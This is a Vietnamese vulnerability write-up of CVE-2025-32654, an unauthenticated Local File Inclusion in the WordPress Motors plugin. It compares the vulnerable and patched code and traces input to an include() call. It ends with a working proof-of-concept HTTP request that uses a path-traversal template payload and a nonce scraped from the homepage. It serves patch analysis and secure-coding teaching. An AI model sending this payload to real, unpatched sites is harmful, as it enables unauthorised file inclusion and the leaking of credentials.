# CVE-2025-32654 Analysis & POC


<!--more-->

## CVE & Basic Info
Plugin **Motors** phiên bản **≤ 1.4.71** chứa lỗ hổng **Local File Inclusion** cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh `include/require`, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã.

* **CVE ID**: [CVE-2025-32654](https://www.cve.org/CVERecord?id=CVE-2025-32654)
* **Vulnerability Type**: Local File Inclusion
* **Affected Versions**: <= 1.4.71
* **Patched Versions**: 1.4.72
* **CVSS severity**: High (8.1)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress Motors Plugin](https://wordpress.org/plugins/motors-car-dealership-classified-listings/)

## Requirements
* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
* **Plugin versions** - **Motors**: **1.4.71** (vulnerable) và **1.4.72** (patched).
* **Diff tool** - [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.

## Analysis

### Patch diff

**Bản lỗi**:

```php {filename="RegisterActions.php v1.4.71" hl_lines=[2]}
public static function motors_ew_grid_tabs() {
	$template = sanitize_text_field( $_POST['template'] );
	// other logic
}
```

Bản lỗi **chỉ lọc ký tự HTML** bằng [`sanitize_text_field()`](https://developer.wordpress.org/reference/functions/sanitize_text_field/), không giới hạn đường dẫn, nên attacker có thể chèn `../` hoặc tên file bất kỳ => `LFI`.

**Bản vá**:

```php {filename="RegisterActions.php v1.4.72" hl_lines=[2,7]}
public static function motors_ew_grid_tabs() {
	$allowed_templates = array(
		'listing-cars/listing-grid-directory-loop-4',
		'listing-cars/listing-grid-directory-loop-3',
		'listing-cars/listing-grid-directory-loop',
	);
	$template = 'listing-cars/' . ( isset( $_POST['template'] ) ? sanitize_file_name( $_POST['template'] ) : '' );
	if ( ! in_array( $template, $allowed_templates, true ) ) {
		wp_send_json_error( 'Invalid template' );
		return;
	}
	// other logic
}
```

Bản vá áp dụng [`sanitize_file_name()`](https://developer.wordpress.org/reference/functions/sanitize_file_name/) + **whitelist** kiểm tra hợp lệ, giúp khóa chặt input và loại bỏ hoàn toàn khả năng khai thác thông qua tham số template.

### Vulnerable Code 

Hàm `motors_ew_grid_tabs()` được đăng ký làm **callback** cho **action hook** có tên `"grid_tabs_widget"` thông qua đoạn mã:

```php
add_action( 'wp_ajax_nopriv_grid_tabs_widget', array( self::class, 'motors_ew_grid_tabs' ) );
```

Tiền tố `wp_ajax_nopriv_` cho biết action này **không yêu cầu người dùng đăng nhập** khi gọi đến endpoint AJAX.
Do đó, endpoint thực tế có thể được truy cập công khai qua:

```
/wp-admin/admin-ajax.php?action=grid_tabs_widget
```

Khi đó `motors_ew_grid_tabs()` được gọi: 

```php {filename="RegisterActions.php v1.4.71" hl_lines=[2,8,48]}
public static function motors_ew_grid_tabs() {
	check_ajax_referer( 'motors_grid_tabs', 'security' );

	$listing_types = apply_filters( 'stm_listings_post_type', 'listings' );

	$tab_type = sanitize_text_field( $_POST['tab_type'] );
	$per_page = intval( $_POST['per_page'] );
	$template = sanitize_text_field( $_POST['template'] );
	$img_size = sanitize_text_field( $_POST['img_size'] );

	$args = array(
		'post_type'      => $listing_types,
		'post_status'    => 'publish',
		'posts_per_page' => $per_page,
	);

	if ( 'popular' === $tab_type ) {
		$args = array_merge(
			$args,
			array(
				'orderby'  => 'meta_value_num',
				'meta_key' => 'stm_car_views',
				'order'    => 'DESC',
			)
		);
	}

	$args['meta_query'][] = array(
		'key'     => 'car_mark_as_sold',
		'value'   => '',
		'compare' => '=',
	);

	$template_args = array();
	if ( ! empty( $img_size ) ) {
		$template_args = array(
			'custom_img_size' => $img_size,
		);
	}

	$listings_query = new WP_Query( $args );

	if ( $listings_query->have_posts() ) {
		$output = '';
		ob_start();
		while ( $listings_query->have_posts() ) {
			$listings_query->the_post();
			do_action( 'stm_listings_load_template', $template, $template_args );
		}
		$output .= ob_get_clean();
	}

	wp_send_json(
		array(
			'html' => $output,
		)
	);
}
```

Trong hàm `motors_ew_grid_tabs()`, dòng đầu tiên:

```php
check_ajax_referer( 'motors_grid_tabs', 'security' );
```

thực hiện **kiểm tra nonce** để bảo vệ khỏi **CSRF (Cross-Site Request Forgery)**.
Nếu nonce gửi từ client không hợp lệ hoặc không tồn tại, hàm này sẽ **dừng toàn bộ quá trình xử lý AJAX** - nghĩa là các đoạn logic phía sau (bao gồm xử lý `$template`, truy vấn bài viết, và render HTML) sẽ **không được thực thi**.

```php {filename="RegisterActions.php v1.4.71" hl_lines=[2,8]}
public static function motors_create_nonce() {
	$grid_tabs_widget = wp_create_nonce( 'motors_grid_tabs' );
	// other logic
	wp_localize_script(
		'jquery',
		'mew_nonces',
		array(
			'motors_grid_tabs' => $grid_tabs_widget,
			// other logic
		)
	);
}
```

Hàm `motors_create_nonce()` tạo nonce cho action `'motors_grid_tabs'` bằng `wp_create_nonce()` rồi truyền sang JavaScript qua `wp_localize_script()` dưới biến `mew_nonces.motors_grid_tabs`.

> [!TIP]
> Vì lỗ hổng này là loại **Unauthenticated**, nên **nonce** không được hiển thị trong khu vực **admin**.
Thay vào đó, hãy truy cập **trang chủ** sau khi plugin đã được cài đặt đầy đủ các phụ thuộc, rồi tìm từ khóa `motors_grid_tabs` trong mã nguồn trang để lấy giá trị **nonce** cần thiết.

{{< figure src="nonce.png" caption="Giá trị nonce hiển thị trong mã nguồn trình duyệt" >}}

Ngoài ra, trong mã nguồn trang chủ còn có đoạn JavaScript thực hiện **gọi AJAX tự động** đến endpoint ta đang focus:

```
/wp-admin/admin-ajax.php?action=grid_tabs_widget
```

khi trang được tải:

```html
<script>
	(function($) {
		$(document).ready(function() {
			$.ajax({
				type: "POST",
				url: ajaxurl,
				dataType: 'json',
				async: true,
				data: 'action=grid_tabs_widget&tab_type=popular&per_page=8&template=listing-cars/listing-grid-directory-loop-4&img_size=&security=' + mew_nonces.motors_grid_tabs,
				success: function(data) {
					if( data.hasOwnProperty('html') ) $('#popular-tab-content').html(data.html);
					updateGridItemTitles();
				},
			});
		});
	})(jQuery)
</script>
```

Đoạn script tự động chạy vì nằm trong `$(document).ready()`, nên khi trang load xong, jQuery sẽ tự thực thi hàm AJAX.

Tận dụng điều này, ta reload trang chủ và bắt ajax request bằng **BurpSuite**, để lấy các param cần thiết do plugin cung cấp.

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: vi,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 168
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/
Cookie: wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; stm_car_watched=2520
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-PwnFox-Color: cyan

action=grid_tabs_widget&tab_type=popular&per_page=8&template=listing-cars/listing-grid-directory-loop-4&img_size=&security=d15dd83890
```

Đặt breakpoint trong hàm `motors_ew_grid_tabs()` tại vị trí xử lý dữ liệu trước khi trả về cho client:

```php {filename="RegisterActions.php v1.4.71" hl_lines=[4]}
ob_start();
while ( $listings_query->have_posts() ) {
	$listings_query->the_post();
	do_action( 'stm_listings_load_template', $template, $template_args );
}
$output .= ob_get_clean();
```

Đoạn mã này chịu trách nhiệm **tạo nội dung HTML động** từ kết quả truy vấn:

* `ob_start()` khởi tạo bộ đệm đầu ra, tạm giữ mọi nội dung được in ra.
* Vòng `while` lặp qua các bài viết trong `$listings_query` và gọi `do_action( 'stm_listings_load_template', $template, $template_args )` để render từng item theo template tương ứng.
* `ob_get_clean()` lấy toàn bộ nội dung đã render trong buffer, xóa bộ đệm và gán vào `$output`.

👉 Kết quả: `$output` chứa toàn bộ HTML đã được sinh ra, sẵn sàng gửi về client qua AJAX.

Khi gửi lại request và quan sát bằng debugger:

{{< figure src="debug1.png" caption="Debugger đi qua các logic lấy post" >}}

Ta thấy rằng với các **tham số mặc định** do plugin gửi lên, điều kiện `$listings_query->have_posts()` luôn **true**, nên action hook `stm_listings_load_template` được gọi và phần xử lý liên quan đến `$template` được thực thi.

Hook `stm_listings_load_template` được đăng ký với callback cùng tên:

```php {filename="templates.php v1.4.71" hl_lines=[3]}
function stm_listings_load_template( $__template, $__vars = array() ) {
	extract( $__vars );
	include stm_listings_locate_template( $__template );
}
add_action( 'stm_listings_load_template', 'stm_listings_load_template', 10, 2 );
```

`include` là một trong những sink gây **LFI** trong WordPress, ta phân tích `stm_listings_locate_template()` để xem giá trị thực sự được `include` là gì => giúp tùy chỉnh payload cho phù hợp

```php {filename="templates.php v1.4.71" hl_lines=[9,10,11,12,13]}
function stm_listings_locate_template( $templates ) {
	$located = false;

	foreach ( (array) $templates as $template ) {
		if ( substr( $template, - 4 ) !== '.php' ) {
			$template .= '.php';
		}

		if ( str_contains( $template, 'partials/' ) ) {
			$located = locate_template( $template );
		} else {
			$located = locate_template( 'listings/' . $template );
		}

		if ( ! ( $located ) ) {
			if ( file_exists( realpath( apply_filters( 'stm_listings_template_file', STM_LISTINGS_PATH, $template ) . '/templates/' . $template ) ) ) {
				$located = realpath( apply_filters( 'stm_listings_template_file', STM_LISTINGS_PATH, $template ) . '/templates/' . $template );
			}
		}

		if ( file_exists( $located ) ) {
			break;
		}
	}

	return apply_filters( 'stm_listings_locate_template', $located, $templates );
}
```

Hàm `stm_listings_locate_template()` nhận tham số `$templates`, ép kiểu về mảng rồi **duyệt qua từng phần tử** để xác định đường dẫn file template hợp lệ cần nạp.

Cụ thể:

* Nếu phần tử không có hậu tố `.php`, hàm sẽ tự động nối thêm.
* Nếu đường dẫn chứa chuỗi `'partials/'`, nó gọi `locate_template( $template )` gán giá trị trả về cho `$located`.
* Ngược lại, nó tìm trong thư mục `'listings/'` và gán giá trị trả về cho `$located`.
* Nếu vẫn không tìm thấy, hàm thử kiểm tra trực tiếp trong plugin bằng cách ghép:

```
STM_LISTINGS_PATH . '/templates/' . $template
```

* Khi phát hiện file tồn tại (`file_exists()`), vòng lặp dừng lại và trả về đường dẫn đó.

[`locate_template()`](https://developer.wordpress.org/reference/functions/locate_template/) là hàm **core của WordPress**. Nó tìm file template trong theme hiện tại hoặc child theme. Nếu tìm thấy, nó trả về đường dẫn đầy đủ đến file, còn không thì trả về chuỗi rỗng. => Ta cần truyền file tồn tại.

👉 Kết quả cuối cùng được trả về qua filter `stm_listings_locate_template` với đường dẫn là `$locate`

{{< figure src="search1.png" caption="Không có filter `stm_listings_locate_template` được đăng ký" >}}

Khi tìm với từ khóa `stm_listings_locate_template` trong phạm vi plugin, tôi không thấy filter nào được đăng ký => `$locate` sẽ được trả về mà không có thay đổi do filter. 

Như vậy điều kiện cần để khai thác bao gồm:
* `template` param chứa `partials/` hoặc `listings/`
* `../` vừa đủ để `locate_template()` trong trả về chuỗi rỗng và `include` không lỗi nếu đường dẫn không tồn tại

## Exploit
### Proof of Concept (PoC)

1. Thêm code trả về trong `wp-config.php` để thử nghiệm 

```php
<?php
echo "payload"
```

2. Gửi POST request chứa LFI payload

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: vi,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 123
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/
Cookie: wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; stm_car_watched=2520
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-PwnFox-Color: cyan

action=grid_tabs_widget&tab_type=popular&per_page=8&template=/partials/../../../../../payload&img_size=&security=d15dd83890
```

**Result**:

{{< figure src="result.png" caption="Kết quả LFI thành công" >}}

## Conclusion

CVE-2025-32654 là một **LFI** trong plugin **Motors ≤1.4.71**: tham số `template` không được ràng buộc, cho phép path traversal và `include()` file bất kỳ. Endpoint công khai (`wp_ajax_nopriv_`) và nonce xuất trên front‑end giúp kẻ tấn công dễ khai thác. Lỗ hổng được vá trong **v1.4.72** bằng cách chuẩn hoá tên file và kiểm tra **whitelist**.

## Key takeaways

* Không dùng input thô để build đường dẫn cho `include`.
* Ưu tiên **whitelist** template/đường dẫn hợp lệ.
* Chuẩn hoá (e.g. `sanitize_file_name()`/`sanitize_key()`), dùng `realpath()` để so sánh với thư mục gốc.
* Nếu endpoint phải công khai, bắt buộc kiểm soát chặt input chứ đừng chỉ trông vào nonce.

## References

[File Inclusion/Path traversal — Hacktrick](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols)

[ WordPress Motors Plugin <= 1.4.71 is vulnerable to Local File Inclusion ](https://patchstack.com/database/wordpress/plugin/motors-car-dealership-classified-listings/vulnerability/wordpress-motors-plugin-1-4-65-local-file-inclusion-vulnerability-2?_s_id=cve)


---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-10-14-cve-2025-32654/  

